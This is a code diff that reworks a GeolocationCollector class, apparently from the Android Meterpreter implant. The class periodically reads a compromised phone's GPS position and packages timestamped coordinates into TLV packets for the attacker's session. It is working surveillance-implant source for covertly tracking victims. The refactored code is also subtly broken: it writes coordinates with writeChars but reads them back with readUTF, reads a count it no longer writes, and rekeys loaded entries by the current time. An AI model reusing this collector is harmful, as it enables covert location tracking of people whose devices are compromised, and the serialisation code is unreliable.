@@ -23,8 +23,6 @@ import java.util.List;
 import java.util.Hashtable;
 
 //Logging
-import android.os.Handler;
-import android.os.Looper;
 import android.util.Log;
 
 //This class
@@ -37,87 +35,40 @@ public class GeolocationCollector extends IntervalCollector  {
     private final Object syncObject = new Object();
     protected LocationManager mLocationManager;
     public Location mLocationObj;
-    public GeoModel mGeoModolObj = new GeoModel();
-    private Hashtable<Long, List<GeoModel>> collections = null;
-    List<GeoModel> mGeoTagList = new ArrayList<GeoModel>();
-    public Handler handler;
+    private Hashtable<Long, GeoModel> collections = null;
     
     private class GeoModel {
         
         public long mUnixEpoch;
         public double  mLatitude,mLongitude;
-        private String Geolatsring,Geolongstring ;
+        public String mGeolatsring,mGeolongstring ;
         
         public void setmUnixEpoch(){
             mUnixEpoch =  System.currentTimeMillis();
         }
         
         public void  setLatitudeAndLong(Location location ){
-            // mLatitude
             mLatitude = location.getLatitude();
             mLongitude = location.getLongitude();
+            mGeolatsring    = Double.toString(location.getLatitude());
+            mGeolongstring  = Double.toString(location.getLongitude());
         }
         
         public void write(DataOutputStream output) throws IOException {
             
-            Geolatsring = Double.toString(this.mLatitude);
-            Geolongstring = Double.toString(this.mLongitude);
+            
             Log.i("Geocollection Interval","in Write function");
-            Log.d("Geocollection Interval", "WriteFunction LatString= "+Geolatsring);
-            Log.d("Geocollection Interval", "WriteFunction LatString= "+Geolongstring);
+            Log.d("Geocollection Interval", "WriteFunction LatString= "+this.mGeolatsring);
+            Log.d("Geocollection Interval", "WriteFunction LatString= "+this.mGeolongstring);
             output.writeLong(this.mUnixEpoch);
-            output.writeChars(Geolatsring);
-            output.writeChars(Geolongstring);
+            output.writeChars(this.mGeolatsring);
+            output.writeChars(this.mGeolongstring);
         }
     }
-    /*
-    @Override
-    public void run() {
-    Looper.prepare();
-    handler = new Handler();
-    mLocationManager.requestLocationUpdates(
-    LocationManager.GPS_PROVIDER,
-    MINIMUM_TIME_BETWEEN_UPDATES,
-    MINIMUM_DISTANCE_CHANGE_FOR_UPDATES,
-    new MyLocationListener());
-    Looper.loop();
-    }
-    */
-    private class MyLocationListener implements LocationListener {
-        
-        public void onLocationChanged(Location location) {
-            String message = String.format(
-            "New Location \n Longitude: %1$s \n Latitude: %2$s",
-            location.getLongitude(), location.getLatitude()
-            );
-            
-            Log.i("MyLocationListener","message ="+message);
-            
-            mGeoModolObj.setmUnixEpoch();
-            mGeoModolObj.setLatitudeAndLong(location);
-            mGeoTagList.add(mGeoModolObj);
-            
-        }
-        
-        public void onStatusChanged(String s, int i, Bundle b) {
-            Log.d("MyLocationListener","onStatusChanged ="+s +" : i= "+i);
-            
-        }
-        
-        public void onProviderDisabled(String s) {
-            Log.d("MyLocationListener","onProviderDisabled ="+s);
-        }
-        
-        public void onProviderEnabled(String s) {
-            Log.d("MyLocationListener","onProviderEnabled ="+s);
-        }
-        
-    }
-    
     
     public GeolocationCollector(int collectorId, Context context, long timeout) {
         super(collectorId, context, timeout);
-        this.collections = new Hashtable<Long, List<GeoModel>>();
+        this.collections = new Hashtable<Long, GeoModel>();
         mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
         .getSystemService(Context.LOCATION_SERVICE);
         Log.i("Geocollection Interval","in GeolocationCollector timeout functoin");
@@ -125,7 +76,7 @@ public class GeolocationCollector extends IntervalCollector  {
     
     public GeolocationCollector(int collectorId, Context context) {
         super(collectorId, context);
-        this.collections = new Hashtable<Long, List<GeoModel>>();
+        this.collections = new Hashtable<Long, GeoModel>();
         mLocationManager = (LocationManager) AndroidMeterpreter.getContext()
         .getSystemService(Context.LOCATION_SERVICE);
         Log.i("Geocollection Interval","in GeolocationCollector functoin");
@@ -140,52 +91,31 @@ public class GeolocationCollector extends IntervalCollector  {
     
     protected boolean collect(DataOutputStream output) throws IOException {
         
-        List<GeoModel> lGeoTagList = new ArrayList<GeoModel>();
-        GeoModel  lGeoMod = new GeoModel();
         Location location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-        String message =  " ";
+        GeoModel lGeoMod = new GeoModel();
         
-        if (location != null) {
-            
-            message  = String.format(
-            
-            "Current Location \n Longitude: %1$s \n Latitude: %2$s",
-            
-            location.getLongitude(), location.getLatitude()
-            
-            );
-            lGeoMod.setmUnixEpoch();
-            
+        lGeoMod.setmUnixEpoch();
+        if (location == null) {
+            lGeoMod.mLatitude = 0;
+            lGeoMod.mLongitude = 0;
+        } else {
             lGeoMod.setLatitudeAndLong(location);
-            
-            Log.i("Geocollection Interval","in Collect  functoin  message="+message);
-            mGeoTagList.add(lGeoMod);
-        }
-        if (mGeoTagList != null) {
-            
-            synchronized (this.syncObject) {
-                this.collections.put(System.currentTimeMillis(), mGeoTagList);
-                
-                // collect requires the result to be the serialised version of
-                // the collection data so that it can be written to disk
-                output.writeLong(this.timeout);
-                output.writeInt(this.collections.size());
-                for (Long ts : this.collections.keySet()) {
-                    lGeoTagList = this.collections.get(ts.longValue());
-                    output.writeLong(ts.longValue());
-                    output.writeInt(lGeoTagList.size());
-                    for (GeoModel geoLocationResult : lGeoTagList) {
-                        Log.d("Geocollection Interval", "geoLocationResult.mLatitude= "+geoLocationResult.mLatitude);
-                        Log.d("Geocollection Interval", "geoLocationResult.mLongitude= "+geoLocationResult.mLongitude);
-                        geoLocationResult.write(output);
-                    }
-                }
-            }
-            
-            return true;
         }
         
-        return false;
+        synchronized (this.syncObject) {
+            this.collections.put(System.currentTimeMillis(), lGeoMod);
+            // collect requires the result to be the serialised version of
+            // the collection data so that it can be written to disk
+            output.writeLong(this.timeout);
+            output.writeInt(this.collections.size());
+            for (Long ts : this.collections.keySet()) {
+                lGeoMod = this.collections.get(ts.longValue());
+                output.writeLong(ts.longValue());
+                lGeoMod.write(output);
+            }
+        }
+        
+        return true;
     }
     
     protected void loadFromMemory(DataInputStream input) throws IOException {
@@ -194,20 +124,22 @@ public class GeolocationCollector extends IntervalCollector  {
         for (int i = 0; i < collectionCount; ++i) {
             long ts = input.readLong();
             int resultCount = input.readInt();
-            List<GeoModel  > results = new ArrayList<GeoModel  >();
+            
             for (int j = 0; j < resultCount; ++j) {
-                //results.add(new GeoModel  (input));
+                GeoModel lGeoModObj  = new   GeoModel();
+                lGeoModObj.mGeolatsring   =  input.readUTF();
+                lGeoModObj.mGeolongstring  =  input.readUTF();
+                this.collections.put(System.currentTimeMillis(), lGeoModObj);
             }
-            this.collections.put(ts, results);
         }
     }
     
     public boolean flush(TLVPacket packet) {
-        Hashtable<Long, List<GeoModel>> collections = this.collections;
+        Hashtable<Long, GeoModel> collections = this.collections;
         synchronized (this.syncObject) {
             // create a new collection, for use on the other thread
             // if it's running
-            this.collections = new Hashtable<Long, List<GeoModel>>();
+            this.collections = new Hashtable<Long, GeoModel>();
         }
         
         List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
@@ -215,7 +147,7 @@ public class GeolocationCollector extends IntervalCollector  {
         
         for (Long ts : sortedKeys) {
             long timestamp = ts.longValue();
-            List<GeoModel> GeolocResults = collections.get(timestamp);
+            GeoModel geoLoc = collections.get(timestamp);
             
             TLVPacket resultSet = new TLVPacket();
             
@@ -226,20 +158,19 @@ public class GeolocationCollector extends IntervalCollector  {
                 Log.d("Geocollection Interval", Log.getStackTraceString(e.getCause().getCause()));
             }
             
-            for (int i = 0; i < GeolocResults .size(); ++i) {
-                GeoModel result = GeolocResults .get(i);
-                TLVPacket geolocationSet = new TLVPacket();
-                Log.d("Geocollection Interval", "geolocationSet="+geolocationSet);
-                try {
-                    geolocationSet.add(interval_collect.TLV_TYPE_GEO_LAT, result.mLatitude);
-                    geolocationSet.add(interval_collect.TLV_TYPE_GEO_LONG, result.mLongitude);
-                    Log.d("Geocollection Interval", "In Try block geolocationSet="+geolocationSet);
-                    resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);
-                }
-                catch (IOException e) {
-                    Log.d("Geocollection Interval", Log.getStackTraceString(e.getCause().getCause()));
-                }
+            
+            TLVPacket geolocationSet = new TLVPacket();
+            Log.d("Geocollection Interval", "geolocationSet="+geolocationSet);
+            try {
+                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LAT, geoLoc.mGeolatsring);
+                geolocationSet.add(interval_collect.TLV_TYPE_GEO_LONG, geoLoc.mGeolongstring);
+                Log.d("Geocollection Interval", "In Try block geolocationSet="+geolocationSet);
+                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GEO, geolocationSet);
             }
+            catch (IOException e) {
+                Log.d("Geocollection Interval", Log.getStackTraceString(e.getCause().getCause()));
+            }
+            
             
             try {
                 Log.d("Geocollection Interval", "In  packet Try block result Set="+resultSet);
@@ -254,4 +185,3 @@ public class GeolocationCollector extends IntervalCollector  {
         return true;
     }
 }
-
